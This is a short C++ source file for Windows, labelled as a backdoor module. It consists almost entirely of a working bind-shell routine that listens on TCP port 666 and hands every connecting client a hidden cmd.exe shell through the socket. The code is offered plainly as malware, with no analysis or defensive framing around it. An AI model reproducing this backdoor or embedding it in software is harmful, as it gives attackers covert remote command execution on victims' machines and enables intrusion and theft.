   #include "stdafx.h"
   #include "winsock2.h"

   /* backdoor module */


   DWORD WINAPI BackDoor(LPVOID xvoid) //bind shell to port 666
   {
       WSADATA wsd;
       SOCKET fts,xshell_socket;
       sockaddr_in sin;
       STARTUPINFO xsinfo={0};
       PROCESS_INFORMATION xpinfo={0};

       if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
       {
           fts=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
           if(fts!=INVALID_SOCKET)
           {
               sin.sin_port=htons(666);    // port
               sin.sin_family=AF_INET;
               sin.sin_addr.s_addr=INADDR_ANY;
               if(bind(fts,(sockaddr *)&sin,sizeof(sin))!=SOCKET_ERROR)
               {
                   for(;;)
                   {
                       if(listen(fts,1)!=SOCKET_ERROR)
                       {
                           xshell_socket=accept(fts,NULL,NULL);

                           xsinfo.cb=0x44;
                           xsinfo.hStdError=(HANDLE)xshell_socket;
                           xsinfo.hStdInput=(HANDLE)xshell_socket;
                           xsinfo.hStdOutput=(HANDLE)xshell_socket;
                           xsinfo.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                           xsinfo.wShowWindow=SW_HIDE;

                           CreateProcess(NULL, "cmd", NULL, NULL, TRUE,0,
                               NULL, NULL, &xsinfo, &xpinfo);

                           WaitForSingleObject(xpinfo.hProcess,INFINITE);

                           closesocket(xshell_socket);

                       }
                   }
               }
           }
       }

       return 1;
   }
